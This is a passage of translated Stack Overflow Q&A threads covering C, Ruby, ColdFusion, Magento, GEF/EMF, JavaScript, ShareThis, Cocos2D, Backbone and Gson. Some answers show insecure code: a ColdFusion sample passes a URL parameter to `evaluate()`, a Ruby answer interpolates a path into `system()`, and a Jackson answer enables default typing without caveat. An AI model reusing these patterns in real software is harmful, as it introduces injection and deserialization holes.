void 在 C 中用作数据类型，想想看，我从未听说过 C 中与 NOP 等效的汇编语言，因此在一行中单独使用 void 可能是一个错误。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-06-27T23:37:55.263

它看起来像向函数声明参数的旧风格。这相当于`int main(void)`. 有些编译器仍然接受它，有些则不接受。例如，这段代码在我试过的两个编译器中编译：

```
void main(i, j) {
    int;
    long;

    i = 12;
    j = 123456;
    printf("%d %d\n", i, j);
} 
```

[C 函数声明中无类型参数](https://stackoverflow.com/questions/6692499/untyped-arguments-in-a-c-function-declaration)的答案对这种情况有更精确的定义。

无论如何，这是不推荐的，所以我们可以坚持“正常”的声明函数的方式吗？:)

# ruby-on-rails-3 - Rails 3：如何获取外部 ruby 脚本输出

> ID：11235849
> 
> 赞同：0
> 
> 时间：2012-06-27T22:48:21.290
> 
> 标签：ruby-on-rails-3, controller

我正在做一个在线评判应用程序，我希望从控制器运行一个 ruby​​ 脚本（或一个 c++、java 等程序），将输出保存在一个变量中，并将其与我的数据库中的测试文件进行比较。

我坚持运行程序并检查它发送到标准输出的答案。我已经尝试过`answer = load path`，（作为脚本路径的“路径”变量）但返回“true”而不是标准输出内容；但`answer = `ruby path``它不识别路径变量。

提前感谢您的时间。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T01:43:50.010

试试这个：`system("ruby #{path}")`，但注意不要将任何用户提交的信息传递给路径变量（或至少彻底清理它），因为这可能会带来极其严重的安全风险。

# ruby - 如何使用 Watir::Browser 关闭所有打开的 chrome 或重用已经打开的？

> ID：11235852
> 
> 赞同：0
> 
> 时间：2012-06-27T22:48:26.413
> 
> 标签：ruby, google-chrome, watir-webdriver

问题是该应用程序是持久的，并且作为客户端和 Intranet 站点之间的一个层。当客户端发出请求时，服务器会使用 ChromeDriver 打开新的 chrome 窗口，进行身份验证、请求信息、解析并显示给客户端。客户端可以执行数十或数百个请求来获取新数据。但是，如果客户接下来大约 10 分钟没有工作，他的请求会打开新的 chrome 窗口。

我找不到使用 Watir::Browser 的任何方法来重用已打开的窗口或至少关闭已打开的窗口，除非

```
system("taskkill /t /f /im chrome.exe") 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-10-14T14:41:52.743

```
browser.windows.each do |window|
  window.close
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T14:48:53.877

看看这个关闭所有窗口。

```
def close_all_windows
  loop do
    begin
      Watir::Chrome.attach(:title, //).close
    rescue Watir::Exception::NoMatchingWindowFoundException
      break
    rescue
      retry
    end
  end
end 
```

如果我是你，我更愿意将焦点切换到已经打开的窗口上。像下面这样：

```
browser.window(:title => "bbc.co.uk").use do
  # your code
end 
```

# forms - 如何使用 ColdFusion 为选中和未选中的动态命名单选按钮组提交值？

> ID：11235859
> 
> 赞同：1
> 
> 时间：2012-06-27T22:49:16.273
> 
> 标签：forms, button, coldfusion, radio-group

我为用户创建了一个表单，可以将各种图像上传到图库中。他们可以选择图像，它应该进入哪个现有类别（或创建一个新类别）以及是否将图像显示为该类别的“特色”图像。

这是表格：

```
<FORM action='update_gallery.cfm' method='post' NAME="addform">
<TABLE align='center' cellpadding='10' cellspacing='5'>
<TR><TH>Delete</TH><TH>Image File</TH><TH>Preview</TH><TH>Category</TH><TH>New Category</TH><TH>Description</TH><TH>Featured?</TH></TR>
<CFOUTPUT QUERY="getGallery">
<TR>
<TD><INPUT NAME="ID" TYPE="checkbox" VALUE="#ID#" /></TD>
<TD>#IMAGE#</TD>
<TD><IMG SRC="../images/#IMAGE#" WIDTH='50' HEIGHT='50' /><INPUT TYPE="hidden" NAME="IMAGE" VALUE="#IMAGE#" /></TD>
<TD>
    <SELECT NAME='CATEGORY'>
    <CFLOOP query="getCategory">
        <OPTION <cfif #getGallery.CATEGORY# IS '#getCategory.CATEGORY#'>SELECTED</cfif>>#getCategory.CATEGORY#</OPTION>
    </CFLOOP>
</SELECT>
</TD>
<TD><INPUT TYPE="text" SIZE='30' NAME='NewCATEGORY' VALUE="" /></TD>
<TD><INPUT TYPE="text" SIZE='35' NAME="IMAGE_DESC" VALUE="#IMAGE_DESC#" /></TD>
<TD align="center">
<INPUT TYPE="radio" NAME="#CATEGORY#_PIC" ID="CATEGORY_PIC" VALUE="Yes" <cfif #CATEGORY_PIC# IS 'Yes'>CHECKED</cfif> />
<INPUT TYPE="hidden" NAME="CATEGORY_PIC" VALUE="#CATEGORY_PIC#">
</TD>
</TR>
<INPUT TYPE="hidden" NAME="HiddenID" VALUE='#ID#' />
</CFOUTPUT>
<TR><TD COLSPAN='6' ALIGN='CENTER'>
<INPUT TYPE="hidden" NAME="Submitted" VALUE='Y' /><INPUT TYPE="submit" VALUE='Process Updates' /></TD></TR>
</TABLE>
</FORM> 
```

这是我不知道该怎么做的复杂部分——对于每个独特的类别，只能选择一个特色图片，所以我为每个类别创建了一个动态命名的单选组，其中只能有一个项目为每个类别选择。提交表单时，就 ColdFusion 而言，“未选中”单选按钮不存在。我需要为未选中的按钮提交一个“否”值到数据库中，为选中的按钮提交一个“是”值。这个值应该是 CATEGORY_PIC 值，我为此创建了一个隐藏的表单字段。

我已经连续工作了 4 天，并搜索了我能找到的每一个可能的类似场景，但没有什么与我想要完成的相同。这不会那么困难，但我只是不知道如何做到这一点。

我正在使用 MS Access 数据库运行 ColdFusion 9。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T23:28:49.757

您不能在 update_gallery.cfm 页面上对它们进行参数化吗？

```
<cfparam name="CATEGORY_PIC" default="No"> 
```

对于动态

```
<cfparam name="#category#_pic" default="no"> 
```

或者

```
<cfscript>if(!isDefined('CATEGORY_PIC')){CATEGORY_PIC='No';}</cfscript>
<cfscript>if(!isDefined('#CATEGORY#_PIC')){'#CATEGORY#_PIC'='No';}</cfscript> 
```

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2012-06-27T23:56:29.983

```
<!--- Sample Data Set --->
<cfset gallery = "1,1.jpg,preview1.jpg,cat1,description1,true
5,5.jpg,preview5.jpg,cat1,description5,false
2,2.jpg,preview1.jpg,cat2,description2,false
6,6.jpg,preview6.jpg,cat2,description6,true
3,3.jpg,preview3.jpg,cat3,description3,false
7,7.jpg,preview7.jpg,cat3,description7,true
4,4.jpg,preview4.jpg,cat4,description4,true
8,8.jpg,preview8.jpg,cat4,description8,false">
<cfset category = "cat1
cat2
cat3
cat4">
<cfif isDefined('data')>
    <cfsetting showdebugoutput="false">
    <cfif isDefined(data)>
        <cfoutput>#evaluate(data)#</cfoutput>
    </cfif>
<cfelse>
    <!--- Populate Queries --->
    <cfhttp
        name="getGallery"
        method="get"
        url="#script_name#?data=gallery"
        firstrowasheaders = "no" 
        columns = "id,image,preview,category,image_desc,category_pic"
    />
    <cfhttp
        name="getCategory"
        method="get"
        url="#script_name#?data=category"
        firstrowasheaders = "no" 
        columns = "category"
    />

    <!--- Jennifer's Code --->   
    <form action='update_gallery.cfm' method='post' name="addform">
        <table align='center' cellpadding='10' cellspacing='5'>
            <tr><th>delete</th><th>image file</th><th>preview</th><th>category</th><th>new category</th><th>description</th><th>featured?</th></tr>
            <cfoutput query="getgallery">
                <tr>
                    <td><input name="id" type="checkbox" value="#id#" /></td>
                    <td>#image#</td>
                    <td><img src="../images/#image#" width='50' height='50' /><input type="hidden" name="image" value="#image#" /></td>
                    <td>
                        <select name='category'>
                            <cfloop query="getcategory">
                                <option <cfif getgallery.category eq getcategory.category>selected</cfif>>#getcategory.category#</option>
                            </cfloop>
                        </select>
                    </td>
                    <td><input type="text" size='30' name='newcategory' value="" /></td>
                    <td><input type="text" size='35' name="image_desc" value="#image_desc#" /></td>
                    <td align="center">             
                        <input type="radio" name="#getGallery.category#_pic" id="category_pic" value="#id#" <cfif getGallery.category_pic>checked="checked"</cfif>>
                    </td>
                </tr>
                <input type="hidden" name="hiddenid" value='#id#' />
            </cfoutput>
            <tr><td colspan='6' align='center'>
            <input type="hidden" name="submitted" value='y' /><input type="submit" value='process updates' /></td></tr>
        </table>
    </form>

</cfif> 
```

# magento - 如何在 Magento 中制作完整的出口产品（算法）

> ID：11235860
> 
> 赞同：0
> 
> 时间：2012-06-27T22:49:21.373
> 
> 标签：magento, export, product

我需要建立有效的算法来导出 CSV 文件中的所有产品。

问题只是当前安装的 Magento 上现有的**简单**产品导入到新的 Magento，如**可配置**产品。

这个过程的完整算法是什么？

我已经导出/导入所有现有类别。

接下来做什么？也许我应该导入/导出所有属性（属性集）以保存新安装的 Magento 中产品和属性之间的所有依赖关系？

最后是如何处理简单产品中的**自定义选项**。在新 Magento 的出口产品上，此自定义选项应像简单产品一样用于可配置产品。

谢谢！

# eclipse - GEF + EMF：为什么我的编辑器在调用 refreshChildren() 时不删除已删除对象的图形？

> ID：11235861
> 
> 赞同：2
> 
> 时间：2012-06-27T22:49:23.840
> 
> 标签：eclipse, eclipse-plugin, controller, eclipse-emf, eclipse-gef

我已经为类似图形的 EMF 模型实现了 GEF 编辑器，并为图形中的某种类型的节点提供了删除命令。我想我已经完成了所有必要的步骤来完成这个设置（[vainolo](https://stackoverflow.com/users/817399/vainolo)的[博客](http://www.vainolo.com/tag/gef/)提供了很大的帮助）。

但是，当我删除模型元素时，**视图不会刷新**，即模型元素的图形没有从编辑器视图中删除，我不知道为什么。如果有人可以查看我的消息来源并指出任何问题（以及可能的解决方案:)），我将非常感激。提前谢谢了！

*以下是我认为这个问题的重要课程。如果我添加更多代码/编辑代码等，请务必告诉我（我遗漏了我认为没有帮助的代码，例如 getter 和 setter、类变量）。谢谢！*

**图表编辑部分**

```
public class DiagramEditPart extends AbstractGraphicalEditPart {

    public DiagramEditPart(Diagram model) {
        this.setModel(model);
        adapter = new DiagramAdapter();
    }

    @Override protected IFigure createFigure() {
        Figure figure = new FreeformLayer();
        return figure;
      }

      @Override protected void createEditPolicies() {
        installEditPolicy(EditPolicy.LAYOUT_ROLE, new DiagramXYLayoutPolicy());
      }

      @Override protected List<EObject> getModelChildren() {
          List<EObject> allModelObjects = new ArrayList<EObject>();
          if (((Diagram) getModel()).getMyNodes() != null)
          allModelObjects.addAll(((Diagram) getModel()).getMyNodes());
          return allModelObjects;
      }

      @Override public void activate() {
          if(!isActive()) {
              ((Diagram) getModel()).eAdapters().add(adapter);
          }
          super.activate();
      }

      @Override public void deactivate() {
          if(isActive()) {
              ((Diagram) getModel()).eAdapters().remove(adapter);
          }
          super.deactivate();
      }

    public class DiagramAdapter implements Adapter {

          @Override public void notifyChanged(Notification notification) {
              switch (notification.getEventType()) {
            case Notification.REMOVE: refreshChildren();
                break;
            default:
                break;
            }
          }

          @Override public Notifier getTarget() {
              return (Diagram) getModel();
          }

          @Override public void setTarget(Notifier newTarget) {
              // Do nothing.
          }

          @Override public boolean isAdapterForType(Object type) {
              return type.equals(Diagram.class);
          } 

      }

} 
```

**MyNodeEditPart**

```
public class MyNodeEditPart extends AbstractGraphicalEditPart {

    public MyNodeEditPart(MyNode model) {
         this.setModel(model);
         adapter = new MyNodeAdapter();
    }

    @Override protected IFigure createFigure() {
        return new MyNodeFigure();
    }

    @Override protected void createEditPolicies() {
        installEditPolicy(EditPolicy.COMPONENT_ROLE, new MyNodeComponentEditPolicy());
    }

    @Override protected void refreshVisuals() {
        MyNodeFigure figure = (MyNodeFigure) getFigure();
        DiagramEditPart parent = (DiagramEditPart) getParent();
        Dimension labelSize = figure.getLabel().getPreferredSize();
        Rectangle layout = new Rectangle((getParent().getChildren().indexOf(this) * 50), 
                (getParent().getChildren().indexOf(this) * 50), (labelSize.width + 20), 
                (labelSize.height + 20));
        parent.setLayoutConstraint(this, figure, layout);
    }

    public List<Edge> getModelSourceConnections() {
        if ((MyNode) getModel() != null && ((MyNode) getModel()).getDiagram() != null) {
            ArrayList<Edge> sourceConnections = new ArrayList<Edge>();
            for (Edge edge : ((MyNode) getModel()).getDiagram().getOutEdges(((MyNode) getModel()).getId())) {
                sourceConnections.add(edge);
            }
            return sourceConnections;
        }
        return null;
    }

    // + the same method for targetconnections

    @Override public void activate() {
        if (!isActive()) {
            ((MyNode) getModel()).eAdapters().add(adapter);
        }
        super.activate();
    }

    @Override public void deactivate() {
        if (isActive()) {
            ((MyNode) getModel()).eAdapters().remove(adapter);
        }
        super.deactivate();
    }

    public class MyNodeAdapter implements Adapter {

        @Override
        public void notifyChanged(Notification notification) {
            refreshVisuals();
        }

        @Override
        public Notifier getTarget() {
            return (MyNode) getModel();
        }

        @Override
        public void setTarget(Notifier newTarget) {
            // Do nothing
        }

        @Override
        public boolean isAdapterForType(Object type) {
            return type.equals(MyNode.class);
        }

    }

} 
```

**MyNodeComponentEditPolicy**

```
public class MyNodeComponentEditPolicy extends ComponentEditPolicy {

    @Override
    protected Command createDeleteCommand(GroupRequest deleteRequest) {
        DeleteMyNodeCommand nodeDeleteCommand = new DeleteMyNodeCommand((MyNode) getHost().getModel());
        return nodeDeleteCommand;
    }

} 
```

**DeleteMyNode 命令**

```
public class DeleteMyNodeCommand extends Command {

    public DeleteMyNodeCommand(MyNode model) {
        this.node = model;
        this.graph = node.getDiagram();
    }

    @Override public void execute() {
        getMyNode().setDiagram(null);
        System.out.println("Is the model still present in the graph? " + getGraph().getMyNodes().contains(getMyNode())); 
            // Returns false, i.e., graph doesn't contain model object at this point!
    }

    @Override public void undo() {
        getMyNode().setDiagram(getGraph());
    }

} 
```

* * *

## 编辑

重新 execc 的评论：是的，`refreshChildren()`正在被调用。我已经通过覆盖它并添加一个简单的`System.err`行来测试它，该行在删除节点时显示在控制台上：

```
@Override
public void refreshChildren() {
    super.refreshChildren();
    System.err.println("refreshChildren() IS being called!");
} 
```

* * *

## 编辑 2

有趣（嗯...）的事情是，当我关闭编辑器并保留模型，然后重新打开同一个文件时，节点不再绘制，并且模型中不存在。但是，这是什么意思？我在做一个陈旧的模型吗？还是刷新/让模范孩子无法正常工作？

* * *

## 编辑 3

我刚刚发现了一个奇怪的东西，这*可以*解释我的问题吗？在`getModelChildren()`我调用的方法`allModelObjects.addAll(((Diagram) getModel()).getMyNodes());`中，并`getMyNodes()`返回一个**不可修改** `EList`的. 我发现当我尝试按照删除命令中的行做某事时`((Diagram) getModel()).getMyNodes().remove(getMyNode())`，它抛出了一个`UnsupportedOperationException`......嗯。

* * *

## 编辑 4

呃，[有人杀了我好吗](http://www.youtube.com/watch?v=Nfrk2UdEOcQ&feature=fvwrel)？我已经仔细检查过我是否一直在处理同一个`Diagram`对象，而在这样做的时候，我偶然发现了一件非常**尴尬**的事情：

上一个版本中的`getModelChildren()`方法`DiagramEditPart`大约读取。像这样：

```
@Override protected List<EObject> getModelChildren() {
    List<EObject> allModelObjects = new ArrayList<EObject>();
    EList<MyNode> nodes = ((Diagram) getModel()).getMyNodes();
    for (MyNode node : nodes) {
        if (node.getDiagram() != null); // ### D'Uh! ###
            allModelObjects.add(node);
    }
    return allModelObjects;
 } 
```

我想为占用大家的时间而道歉！您的建议非常有帮助，确实帮助我最终找到了这个错误！

我也学到了很多教训，其中包括：总是粘贴原始代码，过度简化可能会掩盖你的错误！我学到了很多关于 EMF `Adapter`、 和 GEF 的知识。仍然：

![在此处输入图像描述](../Images/d23e7704ca72d3b94c8bf04eabb945fe.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-15T19:47:38.260

以下部分代码的第 5 行，即 if 语句后面，多了一个分号`if (node.getDiagram() != null);`：

```
1   @Override protected List<EObject> getModelChildren() {
2       List<EObject> allModelObjects = new ArrayList<EObject>();
3       EList<MyNode> nodes = ((Diagram) getModel()).getMyNodes();
4       for (MyNode node : nodes) {
5           if (node.getDiagram() != null); 
6               allModelObjects.add(node);
7       }
8       return allModelObjects;
9    } 
```

# javascript - 过滤器函数的 JavaScript 函数参数

> ID：11235863
> 
> 赞同：10
> 
> 时间：2012-06-27T22:49:30.303
> 
> 标签：javascript, filter

```
numbers = [1,2,3,4,5,4,3,2,1]; 
var filterResult = numbers.filter(function(i){
    return (i > 2);
}); 
```

我不明白这是如何工作的。如果我省略 i 作为函数参数，它会破坏函数但 i 不与任何东西绑定，那么为什么它需要在那里？

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-06-27T22:57:51.113

`.filter`( [`Array.prototype.filter`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array/filter)) 使用 3 个参数调用提供的函数：

```
function(element, index, array) {
    ... 
```

*   `element`是调用的特定数组元素。
*   `index`是元素的当前索引
*   `array`是被过滤的数组。

您可以使用任何或所有参数。

在您的情况下，`i`指的是`element`并且在您的函数体中使用：

```
function(i){
    return (i > 2);
} 
```

换句话说， “*大于 2 的**过滤元素`element`*” 。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-27T22:55:20.353

i 是在该闭包内时对集合中当前对象的引用。它可以被命名为任何东西，因为它只是一个变量，但在闭包内必须具有相同的名称。`function(){}`您可以使用设计方式的回调，而不是使用`filter`。

引用是通过定义隐式完成的`.filter`，您可以在此处阅读更多信息：http: [//msdn.microsoft.com/en-us/library/ff679973 (v=vs.94).aspx](http://msdn.microsoft.com/en-us/library/ff679973(v=vs.94).aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-27T22:54:21.433

`i`其实非常重要。它告诉过滤器函数有关它所作用的元素的信息。事实上，它就在这里使用`(i > 2)`。

这会保留值大于 2 的元素。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-27T22:56:38.647

这`i`是您提供给的函数的*形式参数*`.filter()`。如果您不插入它，该函数将没有任何方式¹来引用它正在传递的参数（`i`然后函数体内部将引用一些甚至可能没有定义的其他实体——`window.i`这很典型）。

* * *

¹这在技术上是一个谎言，但出于本讨论的目的，请认为这是真的

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-06-28T17:29:16.443

确实是一个旧线程，但只是填补了未说的内容。

括号在那里，程序员可以插入对您的特定程序有意义的任何变量名称。

如果您选择“i”，大多数其他（初学者）程序员可能会认为“哦，我的意思是索引”。这是错误的。

如果您使用一个参数而不是三个参数，我会选择“el”来表示元素，或者如果您的数组包含苏打水的味道，我会选择“味道”。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-04-18T17:27:08.997

那是 ES5 表示法，也许如果你在 ES6 表示法中看到它，你就会明白为什么“i”是必须的：

```
numbers.filter(i => i > 2); 
```

必须始终使用变量来引用您在每次迭代中处理的数组项（在本例中为“i”）。它必须作为参数传递给函数的入口点（在 ES6 中，在箭头之前）。

# api - Sharethis api 热门共享网址

> ID：11235864
> 
> 赞同：0
> 
> 时间：2012-06-27T22:49:54.300
> 
> 标签：api, statistics, sharethis

我正在我的网站上构建一个块，其中包含通过 sharethis api 在我的域中共享最多的 5 个 url，我一直在对其进行测试并得到了一些意想不到的结果......

当我检查域统计 api 时，我得到了预期的结果：

要求：

```
http://rest.sharethis.com/analytics/V2/getDomainStats.php?domain={my-domain}&pub_key={my-publisher-key}&access_key={my-secret-key} 
```

回复：

```
{"status":"SUCCESS","from_date":"20120620","to_date":"20120627","data":
{"domain_summary":[{"clicks":1092,"shares":134,"traffic":1393,"date":"06\/20","channel_stats":
[{"shares":86,"clicks":404,"traffic":412,"channel":"facebook"},
{"shares":25,"clicks":617,"traffic":898,"channel":"email"},
{"shares":12,"clicks":0,"traffic":0,"channel":"fblike"},
{"shares":7,"clicks":42,"traffic":31,"channel":"twitter"},
{"shares":3,"clicks":0,"traffic":0,"channel":"plusone"},
{"shares":1,"clicks":0,"traffic":0,"channel":"pinterest"},
{"shares":0,"clicks":17,"traffic":19,"channel":"blogger"},
{"shares":0,"clicks":12,"traffic":33,"channel":"google_bmarks"}]}..... 
```

自从他们回去一周后，我显然已经截断了这些结果......

当我试图找出我的域中最活跃的 url 时：

要求：

```
http://rest.sharethis.com/analytics/V2/getTopUrlStats.php?domain={my-domain}&from_date=2012-06-27&to_date=2012-01-01&pub_key={my-publisher-key}&access_key={my-secret-key} 
```

回复：

```
{"status":"SUCCESS","from_date":"20120627","to_date":"20120101","last_batch_date":"20120626","data":{"top_urls_summary":[]},"today":""} 
```

显然这不是我要找的，我有点击，在 sharethis 网站上，我可以毫无问题地访问我的指标并查看我正在寻找的信息，但 api 没有回答任何数据。我尝试更改日期范围或完全省略它（由于某种原因返回一个空数据集）无济于事。有没有其他人遇到过类似的问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T15:08:08.453

好的 Sharethis 支持终于回复了我这个问题：

根据[sharethis api](http://support.sharethis.com/customer/portal/articles/439606-analytics-api)：

To Date 数据的结束日期。注意：日期必须是 yyyy-mm-dd 格式。默认为 7 天前。

From Date 数据的开始日期。注意：日期必须是 yyyy-mm-dd 格式。默认为“今天”。

这些是倒退的，这就是我的电话不起作用的原因之一，“迄今为止”应该是定义日期范围时的较近日期......“默认值”不起作用，因此您必须输入这两个值，以及何时您输入今天的日期作为“To Date”，它可能会返回“collection failed”，所以最好从昨天开始

# objective-c - Cocos2D：同一类的两个对象碰撞？

> ID：11235868
> 
> 赞同：0
> 
> 时间：2012-06-27T22:50:14.360
> 
> 标签：objective-c, cocos2d-iphone

处理盘子从上到下掉落的游戏。一些板块也会在地面上“反弹”，然后再次开始向上移动。这会导致下降板与“上升板”发生碰撞的情况。

我的问题？我不知道如何检测这种碰撞。

由于所有的盘子都来自同一个班级，我不能写 `if(CGRectIntersectsRect([self boundingBox], [self boudingBox]))` ，因为这个陈述永远是正确的。

我用for循环创建了盘子：

```
for(i=0; i<9; i++){

 Plate *plate = [Plate initPlate];

} 
```

然后在整个游戏中重复使用这些盘子。

关于如何检测两个板之间的碰撞的任何想法或解决方法？任何建议将不胜感激。

问候。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T00:00:56.850

您需要有一个类来管理（例如使用 NSMutableArray）一组板块，而不是在板块类上检查碰撞，而是在这个新类上进行。

假设您的数组是：

```
NSMuttableArray *plateSet 
```

你可以这样做：

```
for (Plate *bouncingPlate in plateSet)
{
    if ([bouncingPlate bouncing])
    {
        for (Plate *fallingPlate in plateSet)
        {
            if (![fallingPlate bouncing])
            {
                /* Check for collision here between fallingPlate and bouncingPlate */
            }
        }
    }
} 
```

或者，更优雅地：

```
for (Plate *bouncingPlate in plateSet)
{
    if (![bouncingPlate bouncing])
    {
        continue;
    }

    for (Plate *fallingPlate in plateSet)
    {
        if ([fallingPlate bouncing])
        {
            continue;
        }
        /* Check for collision here between fallingPlate and bouncingPlate */
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T00:59:31.167

是的...您需要将它们添加到 a`NSMutableArray`然后仅用于`ccpDistance`检查碰撞

像这样的东西：

```
for (int i=0;i<8,i++){
   for (int j=i+1,j<9,j++){
if(ccpDistance([[plates objectAtIndex:i]position],[[plates objectAtIndex:j]position])<plateRadius*2) {
//collision detected
}}} 
```

当然，如果盘子是圆圈，这将有效

对于正方形使用`CGRectIntersectsRect`：

```
 for (int i=0;i<8,i++){
   for (int j=i+1,j<9,j++){
if([plates objectAtIndex:i].visible && [plates objectAtIndex:j].visible &&(CGRectIntersectsRect([[plates objectAtIndex:i]boundingBox],[[plates objectAtIndex:j]boundingBox])) {
//collision detected
}}} 
```

# javascript - 通过 Backbone View 渲染 jQuery 对象

> ID：11235871
> 
> 赞同：1
> 
> 时间：2012-06-27T22:50:40.753
> 
> 标签：javascript, jquery, backbone.js, hogan.js

我对 Backbone.js 开发相当陌生，在尝试渲染子视图时遇到了一些障碍。

目前，我有几个视图来呈现自定义下拉按钮以及其他元素。我已经根据[DocumentCloud 的代码采用了这种方法](https://github.com/documentcloud/documentcloud/blob/master/public/javascripts/ui/common/menu.js)

这是我到目前为止所拥有的：

```
app.ui.SelectMenu = Backbone.View.extend({

    className: 'btn-group group-item',

    options: {
        id: null,
        standalone: false
    },

    events: {
        "click .dropdown-menu a": "setLabel"
    },

    constructor: function (options) {
        Backbone.View.call(this, options);

        this.items = [];
        this.content = JST['common-select_button'];
        this.itemsContainer = $('.dropdown-menu', $(this.content.render()));

        // Add any items that we may have added to the object params
        if (options.items) {
            this.addItems(options.items);
        }
    },

    render: function () {
        this.$el.html(this.content.render({
            label: this.options.label,
            items: this.itemsContainer
        }));
        this._label = this.$('.menu-label');
        return this;
    },

    setLabel: function (label) {
        $(this._label).text(label || this.options.label);
    },

    addItems: function (items) {
        this.items = this.items.concat(items);
        var elements = _(items).map(_.bind(function (item) {
            var attrs = item.attrs || {};
            _.extend(attrs, { 'class': 'menu_item' + (attrs['class'] || '') });

            var el = this.make('li', attrs, item.title);
            return el;
        }, this));

        $(this.itemsContainer).append(elements);
    }
}); 
```

到目前为止，我已经成功地呈现了我的按钮以及相应的标签，但是`.dropdown-menu`在调用该`addItems`函数时我似乎无法填充。

我假设当`render`命中时，由于我传递的是 jQuery 对象而不是字符串，因此无法填充 items 变量，但是每当我使用时`items: this.itemsContainer.html()`，它只是粘贴用引号括起来的 html ......我可以简单地替换报价，但这对我来说就像是一种黑客行为。

任何帮助将非常感激。谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T02:55:28.450

jQuery[`append`](http://api.jquery.com/append/)不接受数组：

> **`.append( content [, content] )`**
> 
> **content**：要插入到匹配元素集中每个元素末尾的 DOM 元素、HTML 字符串或 jQuery 对象。
> **content**：一个或多个附加 DOM 元素、元素数组、HTML 字符串或 jQuery 对象，插入到匹配元素集中每个元素的末尾。

如果要在一次调用中附加多个元素，则必须将它们作为单独的参数提供：

```
$(x).append(e1, e2, e3, ...); 
```

所以你必须使用[`apply`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Function/apply)将你的数组转换为单独的参数：

```
var $i = $(this.itemsContainer);
$i.append.apply($i, elements); 
```

不过，这种诡计确实没有必要，您可以在创建它们时一一添加：

```
addItems: function (items) {
    this.items = this.items.concat(items);
    _(items).each(function (item) {
        var attrs = item.attrs || {};
        _.extend(attrs, { 'class': 'menu_item' + (attrs['class'] || '') });

        this.itemsContainer.append(this.make('li', attrs, item.title));
    }, this);
} 
```

另请注意，它[`_.each`](http://documentcloud.github.com/underscore/#each)可以带一个`context`参数，因此您不需要单独的[`_.bind`](http://documentcloud.github.com/underscore/#bind)调用。而且我很确定它`this.itemsContainer`已经是一个 jQuery 对象，所以你不需要`$()`再次包装它。

你可能也有问题`render`：

```
render: function () {
    this.$el.html(this.content.render({
        label: this.options.label,
        items: this.itemsContainer
    }));
    this._label = this.$('.menu-label');
    return this;
} 
```

我怀疑这`items: this.itemsContainer`将结束 stringifying `this.itemsContainer`，你可能会遇到这样的事情会更好：

```
this.$el.html(this.content.render({ label: this.options.label });
this.$el.find('some selector').append(this.itemsContainer); 
```

当然，哪里`'some selector'`取决于 HTML 结构；您还必须为此调整模板。

* * *

您的 Github 链接已损坏，所以我不知道您正在调整什么代码。我知道你的使用`constructor`是非标准的。为什么不使用标准[`initialize`](http://documentcloud.github.com/backbone/#View-constructor)？

> **构造函数/初始化** `new View([options])`
> 
> [...]如果视图定义了一个`initialize`函数，它将在第一次创建视图时被调用。

你可能应该这样做：

```
app.ui.SelectMenu = Backbone.View.extend({
    // No 'constructor' in here or anywhere...
    initialize: function (options) {
        this.items = [];
        this.content = JST['common-select_button'];
        this.itemsContainer = $('.dropdown-menu', $(this.content.render()));

        // Add any items that we may have added to the object params
        if (options.items) {
            this.addItems(options.items);
        }
    },
    //...
}); 
```

# gson - 使用 Gson 反序列化接口？

> ID：11235875
> 
> 赞同：9
> 
> 时间：2012-06-27T22:51:10.217
> 
> 标签：gson

我正在尝试将 Gson 与接口一起使用：

```
public interface Photo {
    public int getWidth();
}

public class DinosaurPhoto implements Photo {
    ...
}

public class Wrapper {
    private Photo mPhoto; // <- problematic
}

... 

Wrapper wrapper = new Wrapper();
wrapper.setPhoto(new DinosaurPhoto());
Gson gson = new Gson();
String raw = gson.toJson(wrapper);  

// Throws an error since "Photo" can't be deserialized as expected.
Wrapper deserialized = gson.fromJson(raw, Wrapper.class); 
```

由于 Wrapper 类有一个 Photo 类型的成员变量，我该如何使用 Gson 对其进行反序列化？

谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-29T18:39:11.220

自定义反序列化是必要的。

根据要解决的更大问题，应该使用~~["type adapter"]~~ [1](http://google-gson.googlecode.com/svn/trunk/gson/docs/javadocs/com/google/gson/GsonBuilder.html#registerTypeAdapter%28java.lang.reflect.Type,%20java.lang.Object%29)或["type hierarchy adapter"](http://google-gson.googlecode.com/svn/trunk/gson/docs/javadocs/com/google/gson/GsonBuilder.html#registerTypeHierarchyAdapter%28java.lang.Class,%20java.lang.Object%29)。类型层次结构适配器[“是为了涵盖当您想要一个类型的*所有*子类型具有相同表示的情况”](https://groups.google.com/forum/?fromgroups#!searchin/google-gson/interface/google-gson/0ebOxifqwb0/OXSCNTiLpBQJ)。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-06T10:50:20.700

简而言之，你不能用 GSON 做到这一点。

当我偶然发现[杰克逊](http://jackson.codehaus.org/)时，我也被同样的问题困扰。有了它很容易：

```
ObjectMapper mapper = new ObjectMapper();  
mapper.enableDefaultTyping(); 
```

然后你可以去反序列化你的 Java 对象和接口，而无需编写额外的自定义反序列化器、注释，并且实际上没有添加任何代码。

这不是问题的一部分，但如果您决定从 Gson 移植到 Jackson，可能会很有用。Gson 默认支持私有字段，但对于 Jackson，您必须将其包含在您的代码中。

```
mapper.setVisibilityChecker(g.getVisibilityChecker().with(Visibility.ANY)); 
```

您的代码在 main 中的示例实现：

```
ObjectMapper mapper = new ObjectMapper();  
mapper.enableDefaultTyping();
mapper.setVisibilityChecker(g.getVisibilityChecker().with(Visibility.ANY));
Wrapper wrapper = new Wrapper();
